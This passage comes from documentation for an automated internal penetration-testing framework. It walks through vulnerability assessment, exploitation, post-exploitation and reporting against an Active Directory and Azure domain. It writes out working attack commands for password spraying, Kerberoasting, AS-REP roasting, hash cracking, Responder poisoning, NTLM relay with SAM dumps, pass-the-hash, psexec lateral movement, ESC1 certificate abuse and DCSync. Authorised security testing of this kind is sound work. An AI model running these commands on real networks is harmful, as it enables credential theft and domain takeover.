- Overly broad role assignments — Owner or Contributor assigned to external identities, service principals, or large groups

---

### Step 1.10 — Optional Password Spray

**What it does (when SPRAY_ENABLED=true):** Attempts a small number of common corporate password patterns against all domain users, testing whether any account uses a predictable password.

**Safety mechanism:**

Before running, the framework reads `phase2/ad/ad_checks/password_policy.txt`. If the lockout threshold is 5, and `SPRAY_MAX_ATTEMPTS` is 2, there is a 3-attempt safety margin. If `MAX_ATTEMPTS >= lockout_threshold`, the spray is blocked entirely.

**Why spray at all?**

Password spray finds accounts with weak passwords that no other technique would reveal. A user with password `Hashem2025!` will not appear in Kerberoasting results (no SPN), will not appear in AS-REP roasting (pre-auth required), and will not be found by Responder (unless they visit the honeypot network location). Password spray is the only technique that directly tests password quality across the user population.

**Why spray from the Phase 1 userlist?**

Using the full userlist (not just a subset) maximises coverage and targets real accounts — not guesses. The `--continue-on-success` flag means the spray continues even when a hit is found, exposing the full scope of weak passwords rather than stopping at the first success.

**Output:** `phase1/ad/spray_results.txt`

---

### Manual work required after Phase 1 completes

1. Review `fullscan.gnmap` for unusual ports, old service versions, and filtered hosts
2. Import BloodHound ZIP into BloodHound CE UI; run attack path queries
3. Load `roadrecon.db` with `roadrecon gui`; review role assignments and CA policies
4. Review `smb_sweep.txt` for host enumeration details
5. Note all `signing:False` hosts from `relay_target_ips.txt` — these are Phase 3 relay targets
6. Count the userlist — document for report metrics

---

## 6. Phase 2 — Vulnerability Assessment

**Script:** `phases/phase2_va.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 2`  
**Duration:** 30 minutes to 8 hours (ScoutSuite and Nessus are the long-running components)

### Purpose

Phase 2 answers: "What vulnerabilities exist?" It takes the host list and user list from Phase 1 and runs vulnerability checks against them. No exploitation happens here — the goal is to enumerate targets for Phase 3 and document findings that require no further proof (misconfigured policies, absent security controls).

---

### Step 2.1 — ScoutSuite Azure Audit

**What it does:** Runs ScoutSuite against each Azure subscription to audit cloud security posture across all service categories (compute, storage, identity, networking, databases, key management, logging).

**Command:**
```bash
scout azure \
    --tenant $AZURE_TENANT_ID \
    --subscription-id $SUBSCRIPTION_ID \
    --report-dir phase2/cloud/scoutsuite/$SUBSCRIPTION_ID \
    --no-browser
```

**Why ScoutSuite?**

ScoutSuite enumerates hundreds of security checks across Azure that would take days to manually verify. It checks: whether storage accounts allow public access, whether NSGs have overly permissive rules, whether VMs have disk encryption, whether key vaults have soft-delete enabled, whether SQL servers allow unrestricted access. The HTML report is client-deliverable evidence.

**Duration:** 25–45 minutes per subscription. Run in background; check results when other steps complete.

**Output:** `phase2/cloud/scoutsuite/$SUBSCRIPTION_ID/report.html`

**What to look for:**

ScoutSuite rates each finding by severity (danger, warning, good). Prioritise:
- Any "danger" findings in Storage (public blobs), IAM (overprivileged roles), and Network (any-source inbound rules)
- Disabled logging and monitoring (evidence of limited detectability)
- Absent MFA enforcement

---

### Step 2.2 — Azure Security Checks (Targeted)

**What it does:** Runs specific Azure CLI queries for the highest-value security issues, producing focused output files for each category.

**Checks performed:**
- Public blob access: storage accounts with `allowBlobPublicAccess=true`
- NSG overpermission: inbound rules with source `*`, `Internet`, or `0.0.0.0/0`
- Key vault access policies: who has access to each vault
- VMs with public IPs
- Owner/Contributor role assignments (over-privileged identities)
- Storage accounts without HTTPS-only enforcement
- Conditional Access policy inventory

**Outputs:** `phase2/cloud/security_checks/` — one `.txt` file per category

---

### Step 2.3 — AD Security Checks

This is the most technically important step in Phase 2. Each sub-check identifies a specific class of vulnerability.

#### 2.3a — Kerberoastable Account Enumeration

**Command:**
```bash
impacket-GetUserSPNs hashem.local/DOMAIN_USER:DOMAIN_PASS \
    -dc-ip 10.10.1.10
```

**Critical detail:** This command runs **without `-request`**. It only lists accounts with Service Principal Names (SPNs). No TGS ticket is requested; no hash is captured. This is pure reconnaissance.

**Why do SPNs make accounts Kerberoastable?**

In Kerberos, a Service Principal Name is the identifier for a service running under an account. When a client wants to access a service (say, `MSSQLSvc/sql01.hashem.local:1433`), it asks the DC for a TGS (Ticket Granting Service) ticket for that SPN. The DC encrypts the ticket using the NTLM hash of the service account's password. The client receives this encrypted ticket without authenticating to the service.

Kerberoasting exploits this: any authenticated domain user can request a TGS for any SPN. The TGS is encrypted with the service account's password hash. Offline cracking of the TGS reveals the service account's cleartext password.

Why does this matter? Service accounts often have:
1. Weak passwords set years ago by a junior engineer
2. Password-never-expires set (because changing the password requires updating the service configuration on multiple servers)
3. Excessive privileges (often Domain Admin "for convenience")

The count of Kerberoastable accounts from this step tells you how many TGS tickets you will request in Phase 3.

**Output:** `phase2/ad/ad_checks/kerberoastable_accounts.txt`

#### 2.3b — AS-REP Roastable Account Check

**Command:**
```bash
impacket-GetNPUsers hashem.local/ \
    -no-pass \
    -usersfile phase1/ad/userlist.txt \
    -dc-ip 10.10.1.10 \
    -format hashcat
```

**Critical detail:** This runs without `-request` and with `-no-pass`. It is querying which accounts have `DONT_REQUIRE_PREAUTH` set. The `-format hashcat` flag here is for the Phase 2 check's formatting reference — the actual hashes for cracking are captured in Phase 3.

**What DONT_REQUIRE_PREAUTH means:**

Kerberos pre-authentication is a security mechanism that prevents an attacker from requesting AS-REP tickets for arbitrary usernames. Without pre-auth, you submit a username and the DC sends back an AS-REP (Authentication Service Reply) containing an encrypted blob. The blob is encrypted with the user's password-derived key, making it offline-crackable.

Accounts with `DONT_REQUIRE_PREAUTH` disabled (the vulnerable setting) allow anyone — even an unauthenticated user with network access — to receive their AS-REP and attempt to crack it offline. Unlike Kerberoasting, no domain credentials are needed to capture AS-REP hashes. This makes it higher severity in environments where you may not have initial credentials.

The count from this step tells you how many AS-REP hashes you will capture in Phase 3.

**Output:** `phase2/ad/ad_checks/asrep_accounts.txt`

#### 2.3c — Password Policy

**Command:**
```bash
nxc smb 10.10.1.10 -u DOMAIN_USER -p DOMAIN_PASS -d hashem.local --pass-pol
```

**Why this matters for spray safety:**

The password policy tells you the account lockout threshold (e.g., 5 failed attempts = locked). The spray safety check in Phase 1's optional spray step reads this file to validate that `SPRAY_MAX_ATTEMPTS < lockout_threshold`. Without knowing the policy, spraying is reckless.

The password policy also reveals:
- Minimum password length (short minimums = weak passwords are policy-compliant)
- Password complexity requirements
- Password history (how many previous passwords are tracked)
- Lockout duration (how long an account stays locked)
- Observation window (the time window in which failed attempts count toward lockout)

**Output:** `phase2/ad/ad_checks/password_policy.txt`

#### 2.3d — Unconstrained Delegation Check

**Command:**
```bash
ldapsearch -H ldap://10.10.1.10 \
    -D "DOMAIN_USER@hashem.local" -w DOMAIN_PASS \
    -b "DC=hashem,DC=local" \
    '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
    sAMAccountName dNSHostName
```

**The bitmask explained:** `userAccountControl:1.2.840.113556.1.4.803:=524288` — the OID `1.2.840.113556.1.4.803` is the LDAP_MATCHING_RULE_BIT_AND operator. It checks whether bit 524288 (0x80000, the `TRUSTED_FOR_DELEGATION` flag) is set in `userAccountControl`. This identifies computers configured for unconstrained delegation.

**Why unconstrained delegation is a critical finding:**

A computer configured for unconstrained delegation stores TGTs (Ticket Granting Tickets) of every user who authenticates to a service on that computer. Unlike constrained delegation (which specifies which services the computer can delegate to), unconstrained delegation stores the full TGT — which can be reused to authenticate to any service in the domain.

Attack scenario: 
1. Attacker compromises a workstation with unconstrained delegation enabled
2. An administrator authenticates to a file share on that workstation (or a printer connected to it)
3. The workstation caches the administrator's TGT
4. Attacker extracts the TGT using Mimikatz or Rubeus
5. Attacker impersonates the administrator to any service — including the DC's LDAP for DCSync

This is a critical finding when the delegating computer is anything other than a DC (DCs always have this flag for technical reasons and are expected to have it).

**Output:** `phase2/ad/ad_checks/unconstrained_delegation.txt`

#### 2.3e — Password Never Expires Accounts

**Command:**
```bash
ldapsearch -H ldap://10.10.1.10 \
    -D "DOMAIN_USER@hashem.local" -w DOMAIN_PASS \
    -b "DC=hashem,DC=local" \
    '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))' \
    sAMAccountName userAccountControl
```

**The bitmask:** bit 65536 (0x10000) is `DONT_EXPIRE_PASSWD`.

**Why this matters beyond policy compliance:**

Accounts with password-never-expires are disproportionately represented in cracked credential findings. When a password is never rotated, a weak password set in 2018 is still the password in 2026. Service accounts, break-glass accounts, and shared accounts are common offenders. 

If Phase 2 shows 101 accounts with password-never-expires and Phase 3 cracks 12 hashes, look at the overlap: are the cracked accounts in the never-expires group? This confirms the causal relationship (never-expiring passwords → weak passwords → cracked credentials) for the report's business impact narrative.

**Output:** `phase2/ad/ad_checks/pwd_never_expires.txt`

#### 2.3f — AD Certificate Services (Certipy)

**Command:**
```bash
cd phase2/ad/ad_checks/adcs/
certipy-ad find \
    -u DOMAIN_USER@hashem.local -p DOMAIN_PASS \
    -dc-ip 10.10.1.10 \
    -vulnerable \
    -output adcs
```

**Why CWD matters:** Certipy resolves `-output` relative to the current working directory. If run from the project root with an absolute path for `-output`, Certipy replaces `/` with `_` in the path and writes to a mangled filename in the current directory. Running it from within the output directory with a bare basename avoids this.

**What Certipy checks:**

Certipy audits all Active Directory Certificate Services templates and the CA configuration for known attack classes:

- **ESC1** (most common): A template allows domain users to enrol, has Client Authentication EKU, and allows the requester to specify a Subject Alternative Name. This means any domain user can request a certificate that authenticates as Domain Admin by setting the SAN to `administrator@hashem.local`.
- **ESC2**: Template allows Any Purpose EKU or no EKU, enabling arbitrary use
- **ESC3**: Template allows Certificate Request Agent EKU, enabling impersonation chain
- **ESC4**: Template has dangerous access control (write permissions for low-privileged users)
- **ESC5**: PKI object has dangerous access control (CA server ACL vulnerable)
- **ESC6**: CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows SAN in any request
- **ESC7**: CA has dangerous access control — low-privileged user can manage CA
- **ESC8**: NTLM relay to AD CS HTTP enrollment endpoint

**ESC1 exploitation path (to understand the severity):**

If a template is ESC1-vulnerable, the attack is:
```bash
certipy-ad req -u DOMAIN_USER@hashem.local -p DOMAIN_PASS \
    -ca HASHEM-CA -template VulnerableTemplate \
    -target 10.10.1.10 \
    -upn administrator@hashem.local
```
This produces a certificate that authenticates as `administrator`. Use it with:
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.1.10
```
Which returns the NTLM hash of the administrator account without any exploit, RCE, or lateral movement. Domain compromise in two commands from a standard domain user account.

**Output:** `phase2/ad/ad_checks/adcs/adcs_find.txt` and `adcs.json`

---

### Step 2.3g — SMB Vulnerability Module Checks

**What it does:** Runs three vulnerability detection modules against all live hosts simultaneously.

**Command (per module):**
```bash
# nxc does not support -iL; the live hosts are read into a bash array
mapfile -t _smb_targets < phase1/network/live_hosts_all.txt
nxc smb "${_smb_targets[@]}" \
    -u DOMAIN_USER -p DOMAIN_PASS -d hashem.local \
    -M ms17-010
```

**Why `mapfile` instead of `-iL`?**

Unlike nmap, nxc does not accept a file as a target list argument. `mapfile` reads `live_hosts_all.txt` into a bash array, which is then expanded as individual arguments to nxc. This passes all hosts in a single nxc invocation rather than running nxc once per host (which would be extremely slow for large host lists).

**The three modules explained:**

**ms17-010 (EternalBlue)**

Checks for the SMBv1 heap overflow vulnerability (CVE-2017-0144) that was weaponised in WannaCry and NotPetya. A vulnerable host has an unpatched Windows system running SMBv1. Exploitation yields unauthenticated remote code execution as SYSTEM — the highest privilege on the system, without any credentials. 

If this fires, stop. This is the most severe finding in an internal VAPT. In a production environment with inter-VLAN routing, one vulnerable host connected to a critical network segment means complete network compromise is a matter of minutes. Document immediately, notify the client, and do not exploit unless the RoE explicitly covers it.

**nopac (CVE-2021-42278 and CVE-2021-42287)**

Checks for the sAMAccountName impersonation vulnerability. A domain user can rename their computer account to match a DC's sAMAccountName (e.g., `DC01$`), request a Kerberos TGT for that spoofed name, rename it back, then request service tickets using the cached TGT which will be signed by the DC itself as if for the DC's computer account.

A hit means any standard domain user can escalate to Domain Admin in one command. The check authenticates with domain credentials and probes whether the vulnerability conditions are met. If the nopac module returns `VULNERABLE`, the engagement is effectively over at the domain level — document and notify.

**petitpotam (CVE-2021-36942)**

Checks whether the DC's MS-EFSRPC (Encrypting File System Remote Protocol) endpoint can be triggered unauthenticated to force the DC to authenticate via NTLM to an attacker-controlled server.

The attack chain: PetitPotam forces the DC to send NTLM auth → attacker relays that NTLM auth to the AD CS enrollment endpoint (if ESC8 is also present) → attacker receives a certificate for the DC's computer account → use the certificate to obtain the DC's NTLM hash via PKINIT → DCSync.

PetitPotam alone is not critical — it requires AD CS (ESC8) or another relay target to be impactful. But the combination of PetitPotam + AD CS is one of the most dangerous attack chains in modern Windows environments.

**Output:** `phase2/network/smb_vuln_checks.txt`

---

### Step 2.4 — OWASP ZAP DAST

**What it does:** Runs OWASP ZAP in Docker against each URL in `WEB_TARGETS`. ZAP crawls the application and either passively observes (baseline mode) or actively attacks (full mode).

**Why Docker for ZAP?**

Running ZAP via the official Docker image (`ghcr.io/zaproxy/zaproxy:stable`) avoids Java version conflicts, eliminates the need to install ZAP on the attacker box, and ensures a consistent version. The `--network host` flag gives the container direct access to the target network without NAT — necessary for reaching internal hostnames that don't resolve outside the container's bridge network.

**Scan modes:**

- `zap-baseline.py`: Passive scan. ZAP crawls the application using its spider, captures all HTTP responses, and checks them for passive findings (missing security headers, cookie attributes, TLS issues, information disclosure). No attack payloads are sent. Safe to run against production.
- `zap-full-scan.py`: Active scan. ZAP sends attack payloads (SQL injection probes, XSS payloads, path traversal attempts) against every parameter it discovers. This can break application state, generate error logs, and should only run against test environments unless the RoE explicitly covers production active testing.

**Output per target:** `phase2/web/zap/<safe_url_name>/zap_report.html`, `zap_report.json`, `zap_report.xml`

---

### Step 2.5 — Nessus API Trigger (if configured)

When `NESSUS_URL`, `NESSUS_USER`, `NESSUS_PASS`, and `NESSUS_SCAN_ID` are configured, the framework authenticates to Nessus via API and launches the pre-configured credentialed scan. Nessus credentialed scans (with domain credentials) detect missing patches, weak service configurations, and host-level vulnerabilities that network-based scanning cannot find.

If Nessus is not configured, this step logs a reminder to launch the scan manually from the UI.

---

### Manual work required after Phase 2

1. Review `phase2/ad/ad_checks/kerberoastable_accounts.txt` — note SPN names, identify which are service accounts (not user accounts), check their password age if visible
2. Review `phase2/ad/ad_checks/asrep_accounts.txt` — note which user accounts have pre-auth disabled; this is sometimes set intentionally for legacy Kerberos compatibility but usually a misconfiguration
3. Read `password_policy.txt` — document minimum length, complexity, lockout threshold for the report
4. Check `unconstrained_delegation.txt` — any non-DC computers are critical findings
5. Review `adcs_find.txt` for ESC1–ESC8 — these are some of the highest-severity findings
6. Review `smb_vuln_checks.txt` for "VULNERABLE" strings
7. Open ScoutSuite HTML report when the background job completes
8. Open ZAP reports for each web target and review alerts

---

## 7. Phase 3 — Exploitation

**Script:** `phases/phase3_exploit.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 3`  
**Duration:** Responder and Hashcat run all day; active steps take 10–30 minutes

### Purpose

Phase 3 answers: "Can we leverage the identified vulnerabilities to obtain credentials or access?" This is the exploitation phase. Every action with network impact has a checkpoint gate — Responder, relay setup, and PtH sweeps all require explicit operator confirmation before proceeding.

---

### Step 3.1 — Responder (LLMNR/NBT-NS Poisoning)

**Command:**
```bash
sudo timeout $RESPONDER_DURATION responder -I eth0 -rdwF
```

**What Responder does:**

Responder listens on the network for three broadcast name resolution protocols: LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service), and MDNS (Multicast DNS). When a Windows host cannot resolve a hostname via DNS, it falls back to broadcasting a request on the local network segment: "Does anyone know where `FILSERVER` is?" Responder replies to all such queries claiming to be the requested host.

When the Windows client connects to Responder's fake service (SMB, HTTP, etc.), it performs NTLMv2 authentication. Responder captures the NTLMv2 challenge-response hash. This requires no credentials, no exploit code, and no interaction from the attacker other than running Responder. The protocol itself — broadcast name resolution — is enabled by default on all Windows systems.

**The `-rdwF` flags:**
- `-r`: Enable LLMNR poisoning for HTTP requests
- `-d`: Enable NBNS poisoning for DNS suffix queries
- `-w`: Enable WPAD proxy poisoning (captures credentials from web proxy requests)
- `-F`: Force NTLMv2 authentication (prevents downgrades to NTLMv1)

**Why Responder must be stopped at window end:**

Unlike Hashcat (offline CPU job) or nmap (intentional probing), Responder actively poisons broadcast name resolution. It interferes with legitimate network traffic — users may notice that named resources are unreachable (because their resolution request was answered by the attacker, not the actual host). Running Responder overnight means poisoning continues through off-hours maintenance windows, automated backups, and monitoring system queries. The framework schedules an automatic kill via `atd` at `TESTING_WINDOW_END`.

**Where captures land:**

`/usr/share/responder/logs/SMB-NTLMv2-<victim_ip>.txt` — one file per unique source IP. The framework merges all these files into `phase3/ad/ntlmv2_all.txt` before passing to Hashcat.

---

### Step 3.2 — Kerberoasting

**Command:**
```bash
impacket-GetUserSPNs hashem.local/DOMAIN_USER:DOMAIN_PASS \
    -dc-ip 10.10.1.10 \
    -request \
    -outputfile phase3/ad/kerberoast_tickets.txt
```

**The addition of `-request` versus Phase 2:**

In Phase 2, `GetUserSPNs` ran without `-request` to enumerate targets without taking any ticket. Now, with `-request`, the tool authenticates to the DC and requests a TGS ticket for every SPN found. Each TGS is encrypted with the service account's NTLM hash and written to the output file in hashcat format 13100.

**What the TGS looks like:**

```
$krb5tgs$23$*svc_backup$HASHEM.LOCAL$hashem.local/svc_backup*$a3f2...
```

This is the `rc4-hmac` encrypted blob. Hashcat mode 13100 iterates over the wordlist, generates the NTLM hash of each candidate password, tries to decrypt the blob, and succeeds when the checksum matches.

**Output:** `phase3/ad/kerberoast_tickets.txt`

---

### Step 3.3 — AS-REP Roasting

**Command:**
```bash
impacket-GetNPUsers hashem.local/ \
    -no-pass \
    -usersfile phase1/ad/userlist.txt \
    -dc-ip 10.10.1.10 \
    -format hashcat
```

**Key difference from Kerberoasting:**

AS-REP roasting requires **no credentials**. The `-no-pass` flag is not a trick — it genuinely means the tool sends no password. For accounts with `DONT_REQUIRE_PREAUTH`, the DC issues an AS-REP without verifying that the requester knows the account's password. The AS-REP contains an encrypted blob (Hashcat mode 18200: `krb5asrep$23$...`).

This means AS-REP roasting works from outside the domain (with network access to port 88) if you have a username list. The Phase 1 `userlist.txt` provides this list.

**Output:** `phase3/ad/asrep_hashes.txt`

---

### Step 3.4 — Hashcat Cracking

**NTLMv2 cracking (Responder captures):**

```bash
# Mode 5600 = NTLMv2; three separate passes with different wordlists
hashcat -D 1 -w 3 --optimized-kernel-enable -m 5600 \
    phase3/ad/ntlmv2_all.txt \
    /usr/share/wordlists/rockyou.txt \
    -o phase3/ad/cracked_ntlm_rockyou.txt

hashcat -D 1 -w 3 --optimized-kernel-enable -m 5600 \
    phase3/ad/ntlmv2_all.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -o phase3/ad/cracked_ntlm_rules.txt

hashcat -D 1 -w 3 --optimized-kernel-enable -m 5600 \
    phase3/ad/ntlmv2_all.txt \
    $OUTPUT_BASE_DIR/tools/corporate_patterns.txt \
    -o phase3/ad/cracked_ntlm_corp.txt
```

**Kerberoast cracking:**
```bash
hashcat -D 1 -w 3 --optimized-kernel-enable -m 13100 \
    phase3/ad/kerberoast_tickets.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -o phase3/ad/cracked_tgs.txt
```

**AS-REP cracking:**
```bash
hashcat -D 1 -w 3 --optimized-kernel-enable -m 18200 \
    phase3/ad/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -o phase3/ad/cracked_asrep.txt
```

**Why three wordlist passes for NTLMv2?**

1. **rockyou.txt alone**: Catches previously leaked common passwords (14+ million entries). Fast.
2. **rockyou.txt + best64.rule**: Applies 64 common transformations to each word — capitalise first letter, add numbers, add `!`, reverse, etc. Catches passwords like `Password1`, `Admin123!`, `welcome!`. Slower but catches rule-following passwords.
3. **corporate_patterns.txt**: Catches organisation-specific passwords like `Hashem2025!` or `HL@2024` that appear in neither rockyou.txt nor its rule transformations. Generated in Phase 0.

**`-D 1` (CPU) vs `-D 2` (GPU):**

Set `HASHCAT_DEVICE=2` in `config.env` if your attacker box has a GPU. GPU cracking is 10–100x faster depending on the card. On CPU only, NTLMv2 cracking at mode 5600 runs at approximately 20–50 MH/s. A GPU (e.g., RTX 3090) runs at 30,000–50,000 MH/s — roughly 1000x faster. All cracking hashes are merged into unified output files after each job completes:

- `phase3/ad/cracked_ntlm.txt` — merged NTLMv2 cracks (all three passes)
- `phase3/ad/cracked_tgs.txt` — Kerberoast cracks
- `phase3/ad/cracked_asrep.txt` — AS-REP cracks

---

### Step 3.5 — NTLM Relay

**What it does:** Instead of cracking captured hashes, relay the NTLMv2 authentication directly to a host that has SMB signing disabled.

**How it works:**

When Responder is in normal mode, it answers broadcasts AND authenticates the NTLMv2 session itself. In relay mode, Responder answers the broadcast (tells the victim "I am the server you're looking for") but passes off the authentication challenge-response to `ntlmrelayx`, which forwards it to a relay target. The relay target authenticates the session as the victim user, and ntlmrelayx gets a session with the victim's permissions on the relay target.

**Setup:**

1. Modify `Responder.conf` to set `SMB = Off` and `HTTP = Off` — this stops Responder from handling the auth itself and lets ntlmrelayx take it
2. Restart Responder
3. Launch ntlmrelayx:

```bash
sudo impacket-ntlmrelayx \
    -tf phase1/ad/relay_target_ips.txt \
    -smb2support \
    -l phase3/ad/relay_loot/
```

**The `-tf` flag:** Reads target IPs from `relay_target_ips.txt` — the list produced by the SMB signing check in Phase 1. ntlmrelayx round-robins through these targets, trying each one when it receives a relayed authentication.

**The `-l relay_loot/` flag:** When ntlmrelayx successfully relays an authentication and gains admin access, it automatically dumps the SAM database of the relay target and writes it to `relay_loot/`. Each SAM dump contains local account NTLM hashes.

**Output:** `phase3/ad/relay_loot/` — SAM dumps from successfully relayed sessions

---

### Step 3.6 — Pass-the-Hash Sweep

**Command:**
```bash
nxc smb 10.10.0.0/24 \
    -u DOMAIN_USER \
    -d hashem.local \
    -H $OBTAINED_NTLM_HASH
```

**What Pass-the-Hash exploits:**

Windows NTLM authentication does not require the plaintext password — it only requires the NTLM hash. If you obtain an NT hash (from a SAM dump, from a relay, or from Responder capture — provided the user re-used passwords on another site that was breached), you can authenticate to any Windows system using that hash directly without knowing the password.

**`Pwn3d!`** in the CME output means the provided hash has local administrator rights on that host. The framework collects all "Pwn3d!" IP addresses into `phase3/ad/pth_accessible_hosts.txt` — this becomes the SAM sweep target list for Phase 4.

**Why sweep all subnets?**

A single compromised credential — say, a service account with the same password on every host — may have local admin on every workstation in the environment. The sweep makes the blast radius visible: if 47 out of 150 hosts return Pwn3d!, that credential controls nearly a third of the environment.

**Output:** `phase3/ad/pth_accessible_hosts.txt` (IPs of Pwn3d hosts)

---

### Manual work required during Phase 3

1. Monitor Responder logs hourly: `ls /usr/share/responder/logs/SMB-NTLMv2-*.txt`
2. Check Hashcat progress: review the log files in `phase3/ad/hashcat_*.log`
3. Use BloodHound to select relay and lateral movement targets based on graph paths — the automation picks technical targets, but the operator selects strategically
4. If NTLM relay fires, review `relay_loot/` for SAM dump content
5. When hashes are cracked, re-run PtH sweep: `OBTAINED_HASH=<hash> python3 orchestrator.py --phase 3 --only pth_sweep`

---

## 8. Phase 4 — Post-Exploitation

**Script:** `phases/phase4_postexploit.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 4`  
**Duration:** 30 minutes to 2 hours depending on host count and lateral movement depth

### Purpose

Phase 4 answers: "Given the access obtained in Phase 3, what is the full impact?" This phase demonstrates blast radius — how many systems are accessible from one compromised credential, and whether domain-level compromise (DCSync capability) is achievable. Every hop is gated; every action is logged.

---

### Step 4.1 — SAM Sweep on PtH-Confirmed Hosts

**What it does:** For every host in `phase3/ad/pth_accessible_hosts.txt`, runs CME to collect system information and dump the local SAM database.

**Per-host operations:**

```bash
# Collect system info
nxc smb $HOST_IP -u DOMAIN_USER -d hashem.local -H $HASH \
    -x 'whoami && hostname && ipconfig /all'

# List local administrators
nxc smb $HOST_IP -u DOMAIN_USER -d hashem.local -H $HASH \
    --local-groups "Administrators"

# Dump SAM (local account hashes)
nxc smb $HOST_IP -u DOMAIN_USER -d hashem.local -H $HASH \
    --sam
```

**What the SAM database contains:**

The SAM (Security Account Manager) database stores NTLM hashes for all local accounts: Administrator, Guest, and any additional local users. Without LAPS (Local Administrator Password Solution), the local Administrator account often has the same password — and therefore the same NTLM hash — across all workstations in the domain. This means one SAM dump from one machine gives you the local Administrator hash for every machine in the environment.

Each host's evidence is written to `phase4/ad/hop{N}_{ip}.txt` — one file per hop, named sequentially. This creates a clear chain of evidence: hop1 was the first PtH-confirmed host, hop2 was the second, etc.

**Why "hop" naming?**

The hop log feeds the blast radius table in `phase4/blast_radius/blast_radius.md`:

```markdown
| 09:23 | AttackerMachine | 10.10.0.15 | CrackMapExec/hash | hop1_10_10_0_15.txt |
| 09:31 | AttackerMachine | 10.10.0.22 | CrackMapExec/hash | hop2_10_10_0_22.txt |
```

This table is the attack chain section of the technical report. Without this structured logging, writing the report requires manually reconstructing what happened from terminal scrollback.

---

### Step 4.2 — Interactive Lateral Movement via PsExec/WMIExec

**What it does:** Provides an interactive menu for the operator to move laterally to specific targets using credentials obtained in Phase 3.

**Tool choices:**

- `impacket-psexec`: Opens a semi-interactive SYSTEM shell by creating a remote service that launches cmd.exe. Leaves service artefacts on disk (`\\TARGET\ADMIN$\<random>.exe`). More forensic noise, but reliable.
- `impacket-wmiexec`: Executes commands via WMI (Windows Management Instrumentation). No files written to disk; commands run in the context of the supplied user (not SYSTEM). Less forensic noise, better for stealth.

**Command (hash-based):**
```bash
impacket-psexec hashem.local/DOMAIN_USER@10.10.1.5 -hashes :$NTLM_HASH
```

**Every hop requires confirmation.** The checkpoint prompt asks the operator to confirm the target IP, username, and credential before the tool is invoked. This prevents accidental lateral movement to unintended hosts and creates a clear audit trail of what the operator consciously decided to do.

**Evidence per hop:** `phase4/ad/psexec_<ip>.log`

---

### Step 4.3 — DCSync PoC

**What it does:** If BloodHound confirms that the current principal has DCSync rights (Replicating Directory Changes + Replicating Directory Changes All), demonstrates the capability by pulling the hash of one non-sensitive test account.

**Command:**
```bash
impacket-secretsdump hashem.local/PRIVILEGED_USER:PASS@10.10.1.10 \
    -just-dc-user testaccount
```

**What DCSync exploits:**

Domain Controllers replicate directory changes between themselves using the MS-DRSR (Directory Replication Service Remote) protocol. Any principal with the "Replicating Directory Changes" and "Replicating Directory Changes All" rights can use this protocol to request the NTLM hash of any account — as if they were a DC pulling changes. This is not a traditional vulnerability; it is the legitimate replication mechanism being abused by a non-DC principal.

**The gate conditions:**

1. BloodHound must confirm the attack path exists (the operator must answer "yes" to the confirmation prompt)
2. The target account must not be `krbtgt` (blocked by the script) — pulling the KRBTGT hash enables Golden Ticket attacks which persist beyond the engagement end date and are out of scope
3. The target must be a non-sensitive test account (not Domain Admin, not service accounts with sensitive access)
4. The operator must provide the privileged username explicitly

**Why only one non-sensitive account?**

DCSync capability is a binary proof: either the principal can pull hashes or it cannot. Pulling one account's hash proves the capability. Pulling all accounts (the default `impacket-secretsdump` behaviour without `-just-dc-user`) would expose credentials for the entire domain, violating data minimisation principles and likely the RoE.

**Output:** `phase4/ad/dcsync_poc.txt`

**If DCSync succeeds:** Stop. Document immediately. Screenshot the `Dumping Domain Credentials` output line and the hash line. Notify the client. Do not proceed to use the hash further unless the RoE explicitly authorises full domain compromise demonstration.

---

### Step 4.4 — Azure Blast Radius

**What it does:** From the current Azure identity (established in Phase 0), enumerates what resources are accessible: Key Vault secrets, storage containers, resource lists per subscription.

**Key vault secret listing:**
```bash
az keyvault secret list --vault-name $KV_NAME --output table
```

If this succeeds (returns secret names rather than an AuthorizationError), it means the current identity has `secrets/list` permission on the vault. This is a finding — the scope of access granted to the identity is excessive. Note: `secrets/list` shows secret names, not secret values. Accessing the actual secret value requires `secrets/get`.

**Output:** `phase4/cloud/azure_blast.txt`

---

### Step 4.5 — Blast Radius Summary

Automatically generates `phase4/blast_radius/blast_radius_summary.md` containing:
- The full attack chain table from `blast_radius.md`
- All cracked credentials (from Phase 3)
- List of PtH-accessible hosts
- Index of all evidence files from Phases 3 and 4

This document is the starting point for the attack chain section of the technical report.

---

## 9. Phase 5 — Consolidation and Reporting

**Script:** `phases/phase5_consolidate.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 5`  
**Duration:** 5–15 minutes (automated steps); days (manual writing)

### Purpose

Phase 5 answers: "What do we give the client?" It consolidates all evidence into an organised directory, generates SHA-256 checksums of every file, and produces a pre-populated report scaffold with automated finding counts. The actual writing — findings, impact statements, remediation steps, executive summary — is entirely manual.

---

### Step 5.1 — Evidence Consolidation

The framework copies evidence from all phases into a structured `report/evidence/` directory:

```
report/evidence/
├── network/        # fullscan.gnmap, smb_vuln_checks.txt
├── ad/             # bloodhound*.zip, adcs_find.txt, dcsync_poc.txt, responder_session.log
├── cloud/          # scoutsuite report.html, public_blob_poc.txt
├── web/            # zap/<target>/zap_report.html (per target)
├── cracked/        # cracked_tgs.txt, cracked_ntlm.txt, cracked_asrep.txt
└── blast_radius_summary.md
```

This canonical evidence directory is what gets archived, delivered, or referred to in the report.

---

### Step 5.2 — Automated Finding Counts

The framework counts findings from all output files:

```bash
# Examples of automated counts
KERB_COUNT     # grep -c 'krb5tgs' in cracked_tgs.txt
ASREP_COUNT    # grep -c 'krb5asrep' in cracked_asrep.txt
NTLM_COUNT     # wc -l cracked_ntlm.txt
PTH_COUNT      # wc -l pth_accessible_hosts.txt
UNCON_DELEG    # grep -c 'sAMAccountName' in unconstrained_delegation.txt
PNE_COUNT      # grep -c 'sAMAccountName' in pwd_never_expires.txt
ADCS_HITS      # grep -c 'ESC' in adcs_find.txt
